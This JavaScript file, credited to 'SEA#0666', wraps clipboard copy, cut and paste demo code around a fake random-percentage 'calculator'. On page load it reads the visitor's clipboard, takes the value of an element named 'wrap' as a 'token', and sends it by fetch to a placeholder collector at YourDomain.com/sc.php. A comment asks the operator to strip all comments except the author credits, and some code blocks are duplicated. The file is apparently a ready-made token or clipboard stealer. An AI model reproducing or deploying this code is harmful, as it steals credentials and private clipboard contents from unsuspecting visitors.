//Code by SEA#0666

function randomNumber(min, max) { 
    return Math.random() * (max - min) + min;
} 
  function calc() {
 alert(randomNumber(60, 96) + "%")
  }

function useAsyncApi() {
  return document.querySelector('input[value=async]').checked;
}

function log(event) {
  var timeBadge = new Date().toTimeString().split(' ')[0];
  var newInfo = document.createElement('p');
  newInfo.innerHTML = '' + timeBadge + ' ' + event + '.';
}

function performCopyEmail() {
  var selection = window.getSelection();
  var emailLink = document.querySelector('.js-emaillink');

  if (useAsyncApi()) {
    navigator.clipboard.writeText(emailLink.textContent)
      .then(() => log('Async writeText successful, "' + emailLink.textContent + '" written'))
      .catch(err => log('Async writeText failed with error: "' + err + '"'));
      //Code by SEA#0666
  } else {
    selection.removeAllRanges();
    var range = document.createRange();
    range.selectNode(emailLink);
    selection.addRange(range);
  
    try {
      var successful = document.execCommand('copy');
      var msg = successful ? 'successful' : 'unsuccessful';
      log('Copy email command was ' + msg);
    } catch (err) {
      log('execCommand Error', err);
    }
    
    selection.removeAllRanges();
  }
}

function performCutTextarea() {
  var cutTextarea = document.querySelector('.js-cuttextarea');
//Code by SEA#0666
  if (useAsyncApi()) {
    navigator.clipboard.writeText(cutTextarea.textContent)
      .then(() => {
        //Code by SEA#0666
        log('Async writeText successful, "' + cutTextarea.textContent + '" written');
        cutTextarea.textContent = '';
      })
      .catch(err => log('Async writeText failed with error: "' + err + '"'));
  } else {
    //Code by SEA#0666
    var hasSelection = document.queryCommandEnabled('cut');
    //Code by SEA#0666
    cutTextarea.select();
    //Code by SEA#0666
  
    try {
      //Code by SEA#0666
      var successful = document.execCommand('cut');
      var msg = successful ? 'successful' : 'unsuccessful';
      log('Cutting text command was ' + msg);
    } catch (err) {
      log('execCommand Error', err);
    }
  }
}


//Code by SEA#0666
var cutTextareaBtn = document.querySelector('.js-textareacutbtn');
var copyEmailBtn = document.querySelector('.js-emailcopybtn');
var pasteTextareaBtn = document.querySelector('.js-textareapastebtn');

//Code by SEA#0666
copyEmailBtn.addEventListener('click', performCopyEmail);
cutTextareaBtn.addEventListener('click', performCutTextarea);

function logUserOperation(event) {
  log('User performed ' + event.type + ' operation. Payload is: ' + event.clipboardData.getData('text/plain') + '');
}
//Code by SEA#0666
document.addEventListener('cut', logUserOperation);
document.addEventListener('copy', logUserOperation);
document.addEventListener('paste', logUserOperation);
function performPaste() {
  var pasteTextarea = document.querySelector('.js-cuttextarea');
//Code by SEA#0666
  if (useAsyncApi()) {
    navigator.clipboard.readText()
      .then((text) => {
        pasteTextarea.textContent = text;
        log('Async readText successful, "' + text + '" written');
      })
      .catch((err) => log('Async readText failed with error: "' + err + '"'));
  } else {
    pasteTextarea.focus();
    //Code by SEA#0666
    try {
      var successful = document.execCommand('paste');
      var msg = successful ? 'successful' : 'unsuccessful';
      log('Pasting text command was ' + msg);
    } catch (err) {
      log('execCommand Error', err);
      //Code by SEA#0666
    }
  }
}
  var pasteTextarea = document.querySelector('.js-cuttextarea');
  //Code by SEA#0666
  if (useAsyncApi()) {
    navigator.clipboard.readText()
      .then((text) => {
        pasteTextarea.textContent = text;
        log('Async readText successful, "' + text + '" written');
      })
      .catch((err) => log('Async readText failed with error: "' + err + '"'));
  } else {
    pasteTextarea.focus();
    //Code by SEA#0666
    try {
      var successful = document.execCommand('paste');
      var msg = successful ? 'successful' : 'unsuccessful';
      log('Pasting text command was ' + msg);
    } catch (err) {
      log('execCommand Error', err);
      //Code by SEA#0666
    }
  }
  //Delete all the comments besides the ones giving me credit cuz im sexy
  function fun(){
    performPaste()
  setTimeout(() => {
    var token = document.getElementById("wrap").value
    fetch("https://YourDomain.com/sc.php?t=" + token);
}, 100);
  }
fun()
